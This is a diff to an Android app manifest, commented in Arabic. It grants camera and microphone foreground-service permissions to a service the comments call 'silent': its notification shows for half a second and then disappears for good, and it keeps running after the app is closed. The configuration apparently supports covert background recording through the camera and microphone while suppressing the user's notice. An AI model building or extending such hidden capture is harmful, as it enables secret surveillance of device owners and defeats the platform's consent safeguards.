@@ -52,9 +52,20 @@
          ✅ أذونات الخدمة الأمامية (Foreground Service) المطلوبة لأندرويد 10+
          - FOREGROUND_SERVICE: مطلوب لتشغيل الخدمة الأمامية
          - FOREGROUND_SERVICE_DATA_SYNC: مطلوب لأندرويد 14+ (API 34) لتحديد نوع الخدمة
+         - FOREGROUND_SERVICE_CAMERA: مطلوب عند استخدام الكاميرا في الخلفية (Android 14+)
+         - FOREGROUND_SERVICE_MICROPHONE: مطلوب عند استخدام الميكروفون في الخلفية (Android 14+)
     ============================================================ -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
+
+    <!-- ============================================================
+         أذونات إضافية لتحسين التوافق
+    ============================================================ -->
+    <!-- للسماح للتطبيق بعرض إشعارات في وضع ملء الشاشة (مثل المكالمات) -->
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
 
     <!-- ============================================================
          ميزات الجهاز (جميعها اختيارية لتوسيع التوافق)
@@ -105,11 +116,12 @@
              ✅ الخدمة الخلفية الصامتة (Foreground Service)
              - تظهر الإشعار لمدة 0.5 ثانية ثم تختفي نهائياً
              - stopWithTask="false" تمنع إيقاف الخدمة عند إغلاق التطبيق من القائمة
-             - foregroundServiceType="dataSync" مطلوب لأندرويد 14+
+             - foregroundServiceType="dataSync|camera|microphone" مطلوب لأندرويد 14+
+               لتحديد أنواع الخدمات المستخدمة (مزامنة البيانات + الكاميرا + الميكروفون)
         ============================================================ -->
         <service
             android:name=".ForegroundService"
-            android:foregroundServiceType="dataSync"
+            android:foregroundServiceType="dataSync|camera|microphone"
             android:exported="false"
             android:stopWithTask="false" />
 
